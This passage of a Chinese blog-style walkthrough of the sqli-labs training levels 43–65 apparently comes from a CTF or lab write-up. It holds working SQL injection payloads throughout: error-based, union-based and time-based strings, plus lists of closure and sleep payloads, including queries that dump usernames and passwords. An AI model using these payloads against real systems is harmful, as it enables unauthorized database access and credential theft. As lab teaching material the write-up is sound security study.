<span class="variable">@mysqli</span>_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            if($<span class="type">row</span> <span class="operator">=</span> <span class="variable">@mysqli</span>_fetch_row($<span class="keyword">result</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	          if ($<span class="type">row</span>[<span class="number">1</span>])</span><br><span class="line">	          &#123;</span><br><span class="line">	                <span class="keyword">return</span> $<span class="type">row</span>[<span class="number">1</span>];</span><br><span class="line">	          &#125;</span><br><span class="line">	          <span class="keyword">else</span></span><br><span class="line">	          &#123;</span><br><span class="line">	                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	          &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	    print_r(mysqli_error($con1));</span><br><span class="line">	    echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysqli_error($con1));</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="43关：用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入"><a href="#43关：用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入" class="headerlink" title="43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入"></a><strong>43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</strong></h3><p>参考42关 和 38关</p>
<h3 id="44关：同43关，密码处-‘-闭合-二次注入，堆叠注入"><a href="#44关：同43关，密码处-‘-闭合-二次注入，堆叠注入" class="headerlink" title="44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入"></a><strong>44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入</strong></h3><h3 id="45关：同43关，用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入"><a href="#45关：同43关，用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入" class="headerlink" title="45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入"></a><strong>45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</strong></h3><h3 id="46关：显示表单-数字型-报错注入"><a href="#46关：显示表单-数字型-报错注入" class="headerlink" title="**46关：显示表单 数字型 报错注入 **"></a>**46关：显示表单 数字型 报错注入 **</h3><p>页面提示 <strong>“请输入参数为带有数值的 sort”</strong></p>
<p>所以我们将 之前一直使用的  id 换为 sort .返回一张表格</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE70.png">    </p>
<p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此处是数字型注入，因为以下的闭合方式均失败</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?sort=1&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;))--+</span></span><br><span class="line"><span class="string">?sort=1&quot;--+</span></span><br><span class="line"><span class="string">?sort=1&quot;)--+</span></span><br><span class="line"><span class="string">?sort=1&quot;))--+</span></span><br></pre></td></tr></table></figure>

<p>开始注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;~&quot;,database()),<span class="number">3</span>)<span class="comment">-- -//当前数据库名</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;~&quot;,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span>)),<span class="number">2</span>)<span class="comment">-- - //查表</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;!&quot;,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span>  table_name <span class="operator">=</span> <span class="string">&#x27;emails&#x27;</span>)),<span class="number">2</span>)<span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,id,email_id) <span class="keyword">from</span> (<span class="keyword">select</span> id,email_id <span class="keyword">from</span> emails)aaa limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">-- - //查数据，使用limit 控制输出</span></span><br><span class="line"></span><br><span class="line">！<span class="keyword">Every</span> derived <span class="keyword">table</span> must have its own alias！（当不给予表单名字的时候会报错）</span><br><span class="line">所以我们在要查询的数据末尾设置一个名字。这里我使用的是 “aaa”</span><br></pre></td></tr></table></figure>



<h3 id="47关：显示表单-‘-闭合-报错注入"><a href="#47关：显示表单-‘-闭合-报错注入" class="headerlink" title="**47关：显示表单  ‘ 闭合  报错注入 **"></a>**47关：显示表单  ‘ 闭合  报错注入 **</h3><p>参考46关</p>
<h3 id="48关：数字型注入-时间盲注-可尝试-DNS-log注入"><a href="#48关：数字型注入-时间盲注-可尝试-DNS-log注入" class="headerlink" title="**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **"></a>**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **</h3><p>参考其他关卡的时间盲注</p>
<h3 id="49关：’-闭合-时间盲注"><a href="#49关：’-闭合-时间盲注" class="headerlink" title="49关：’ 闭合 时间盲注"></a><strong>49关：’ 闭合 时间盲注</strong></h3><p>同48关，参考其他关卡的时间盲注</p>
<h3 id="50关：数字型注入-报错注入"><a href="#50关：数字型注入-报错注入" class="headerlink" title="**50关：数字型注入 报错注入 **"></a>**50关：数字型注入 报错注入 **</h3><p>参考46关</p>
<h3 id="51关：’-闭合-报错注入"><a href="#51关：’-闭合-报错注入" class="headerlink" title="51关：’ 闭合 报错注入"></a><strong>51关：’ 闭合 报错注入</strong></h3><p>参考46关</p>
<h3 id="52关：数字型注入-时间盲注"><a href="#52关：数字型注入-时间盲注" class="headerlink" title="52关：数字型注入 时间盲注"></a><strong>52关：数字型注入 时间盲注</strong></h3><p>参考其他关卡的时间盲注</p>
<h3 id="53关：’-闭合-时间盲注"><a href="#53关：’-闭合-时间盲注" class="headerlink" title="53关：’ 闭合 时间盲注"></a><strong>53关：’ 闭合 时间盲注</strong></h3><p>参考其他关卡的时间盲注</p>
<h3 id="54-65关-要求在限定步数内完成注入，围绕-challenge-数据库"><a href="#54-65关-要求在限定步数内完成注入，围绕-challenge-数据库" class="headerlink" title="54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库"></a><strong>54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库</strong></h3><h3 id="54关：显错注入-‘-闭合"><a href="#54关：显错注入-‘-闭合" class="headerlink" title="**54关：显错注入 ‘ 闭合 **"></a>**54关：显错注入 ‘ 闭合 **</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27; -- -  //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="comment">-- -  //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(secret_字段),group_concat(sessid) from challenges.表名-- - //查数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">随后将 secret_字段 里的内容放入 Submit Secret Key 中即算过关</span></span><br></pre></td></tr></table></figure>



<h3 id="55关：）闭合-显错注入"><a href="#55关：）闭合-显错注入" class="headerlink" title="55关：）闭合 显错注入"></a><strong>55关：）闭合 显错注入</strong></h3><p>同54关</p>
<h3 id="56关：’-闭合-显错注入"><a href="#56关：’-闭合-显错注入" class="headerlink" title="56关：’) 闭合 显错注入"></a><strong>56关：’) 闭合 显错注入</strong></h3><p>同54关</p>
<h3 id="57关：”-闭合-显错注入"><a href="#57关：”-闭合-显错注入" class="headerlink" title="57关：” 闭合 显错注入"></a><strong>57关：” 闭合 显错注入</strong></h3><p>同54关</p>
<h3 id="58关：’-闭合-报错注入"><a href="#58关：’-闭合-报错注入" class="headerlink" title="58关：’  闭合 报错注入"></a><strong>58关：’  闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,updatexml(1, concat(0x7e, (select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;)) ,1),3-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;9qx3233vht&#x27;</span>)) ,<span class="number">1</span>),<span class="number">3</span><span class="comment">-- -//查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,updatexml(1, concat(0x7e, (select group_concat(secret_字段) from 表名)) ,1),3-- - //查数据</span></span><br></pre></td></tr></table></figure>



<h3 id="59关：数字型注入-报错注入"><a href="#59关：数字型注入-报错注入" class="headerlink" title="59关：数字型注入 报错注入"></a><strong>59关：数字型注入 报错注入</strong></h3><p>payload 参考58关</p>
<h3 id="60关：”）闭合-报错注入"><a href="#60关：”）闭合-报错注入" class="headerlink" title="60关：”）闭合 报错注入"></a><strong>60关：”）闭合 报错注入</strong></h3><p>payload 参考58关</p>
<h3 id="61关：’-闭合-报错注入"><a href="#61关：’-闭合-报错注入" class="headerlink" title="61关：’))  闭合 报错注入"></a><strong>61关：’))  闭合 报错注入</strong></h3><p>payload 参考58关</p>
<h3 id="62关：’-闭合-时间盲注"><a href="#62关：’-闭合-时间盲注" class="headerlink" title="62关：’)  闭合 时间盲注"></a><strong>62关：’)  闭合 时间盲注</strong></h3><h3 id="63关：’-闭合-时间盲注"><a href="#63关：’-闭合-时间盲注" class="headerlink" title="**63关：’ 闭合 时间盲注 **"></a>**63关：’ 闭合 时间盲注 **</h3><h3 id="64关：数字型注入-时间盲注"><a href="#64关：数字型注入-时间盲注" class="headerlink" title="64关：数字型注入  时间盲注"></a><strong>64关：数字型注入  时间盲注</strong></h3><h3 id="65关：”-闭合-时间盲注"><a href="#65关：”-闭合-时间盲注" class="headerlink" title="65关：”) 闭合 时间盲注"></a><strong>65关：”) 闭合 时间盲注</strong></h3><p><strong>所有关卡到此结束</strong></p>
<h2 id="一些-payload"><a href="#一些-payload" class="headerlink" title="一些 payload"></a>一些 payload</h2><p><strong>闭合 payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">%df&#x27;</span> 宽字节</span><br><span class="line"><span class="operator">%</span>df&quot; 宽字节</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">&quot; <span class="keyword">and</span> &quot;1&quot;<span class="operator">=</span>&quot;1</span><br><span class="line">&quot; <span class="keyword">and</span> &quot;1&quot;<span class="operator">=</span>&quot;2</span><br><span class="line">) and (1=1</span><br><span class="line">) and (1=2</span><br><span class="line">&#x27;) and (&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;) and (&#x27;1&#x27;=&#x27;2</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;x</span><br><span class="line">%&#x27;) and 1=1 and (&#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27;) and 1=2 and (&#x27;%&#x27;=&#x27;x</span><br><span class="line">OR 1=1</span><br><span class="line">OR 1=2</span><br><span class="line">&#x27; OR 1=1-- -</span><br><span class="line">&#x27; OR 1=2-- -</span><br><span class="line">) OR 1=1-- -</span><br><span class="line">) OR 1=2-- -</span><br><span class="line">&#x27;) OR 1=1-- -</span><br><span class="line">&#x27;) OR 1=2-- -</span><br><span class="line">&quot; <span class="keyword">OR</span> &quot;1&quot;<span class="operator">=</span>&quot;1</span><br><span class="line">&quot; <span class="keyword">OR</span> &quot;1&quot;<span class="operator">=</span>&quot;2</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;2</span><br><span class="line">) OR (1=1</span><br><span class="line">) OR (1=2</span><br><span class="line">&#x27;) OR (&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;) OR (&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>



<p><strong>order by 黑盒测试 payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">,(<span class="number">1</span><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,(<span class="number">1</span><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,<span class="number">1</span><span class="operator">=</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="number">1</span><span class="operator">=</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">4</span>),(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line"><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>



<p><strong>时间盲注 payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%2b(if((1=1 and sleep(4)),1,(select 1 union select 2)))%2b&#x27;</span>a</span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">4</span>),(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27;;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -</span></span><br><span class="line"><span class="string">;SELECT sleep(4)</span></span><br><span class="line"><span class="string">);SELECT sleep(4)-- -</span></span><br><span class="line"><span class="string">;SELECT sleep(4)-- -</span></span><br><span class="line"><span class="string">;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> SLEEP(<span class="number">4</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="keyword">AND</span> sleep(<span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27; AND sleep(4) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;) AND sleep(4) AND (&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">AND</span> sleep(<span class="number">4</span>) <span class="keyword">AND</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">&quot; AND sleep(4) AND &quot;<span class="number">1</span>&quot;=&quot;</span><br><span class="line"><span class="string">&#x27;) and (select(0)from(select(sleep(4)))x)-- -</span></span><br><span class="line"><span class="string">and (select(0)from(select(sleep(4)))x)</span></span><br><span class="line"><span class="string">and (select(0)from(select(sleep(4)))x) and 1=1</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">&quot; and (select(0)from(select(sleep(4)))x) and &quot;1&quot;=&quot;1</span></span><br><span class="line"><span class="string">) and (select(0)from(select(sleep(4)))x) and (1=1</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">rlike (select(0)from(select(sleep(4)))x) and 1=1</span></span><br><span class="line"><span class="string">&#x27;</span> rlike (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">) rlike (select(0)from(select(sleep(4)))x) and (1=1</span></span><br><span class="line"><span class="string">&#x27;</span>) rlike (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">;waitfor delay &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">4</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">&#x27;</span>;waitfor delay <span class="string">&#x27;0:0:4&#x27;</span> <span class="comment">-- -</span></span><br><span class="line">);waitfor delay <span class="string">&#x27;0:0:4&#x27;</span> <span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27;);waitfor delay &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">4</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">if(now()=sysdate(),sleep(4),0)/*&#x27;</span>XOR(if(now()<span class="operator">=</span>sysdate(),sleep(<span class="number">4</span>),<span class="number">0</span>))<span class="keyword">OR</span><span class="string">&#x27;&quot;XOR(if(now()=sysdate(),sleep(4),0))OR&quot;*/</span></span><br><span class="line"><span class="string">(SELECT * FROM(SELECT(sleep(4)))lWuP)</span></span><br></pre></td></tr></table></figure>



<p><strong>显错注入 payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>判断当前数据表中有几列:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 数值 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.查看显示位在第几列(这里假设共有3列)：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>显示当前数据库(假设显示位在第<span class="number">3</span> 列)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.查询当前数据库的所有表：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>查询所有数据库 ：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6.查询某个数据库中的表 (此例为 test 数据库)：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>查询某个表中的所有字段 (此例为 test数据库中的users 表)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=‘test&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>查询某个表中的字段内容(此例为 test数据库中的users 表)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,<span class="number">0x3a</span>,password) <span class="keyword">from</span> test.users) <span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="sqlmap-注入过程详解"><a href="#sqlmap-注入过程详解" class="headerlink" title="sqlmap 注入过程详解"></a>sqlmap 注入过程详解</h2><p>sqlmap 在完成一次完整注入过程中发生了什么呢？</p>
<p><strong>1.环境</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">burp suite v_2021.6.2</span><br><span class="line">sqlmap v_1.5.8</span><br><span class="line">封神台、sqli靶场</span><br></pre></td></tr></table></figure>

<p>**2.开始测试 **</p>
<p>1.将sqlmap 的请求经过burpsuite</p>
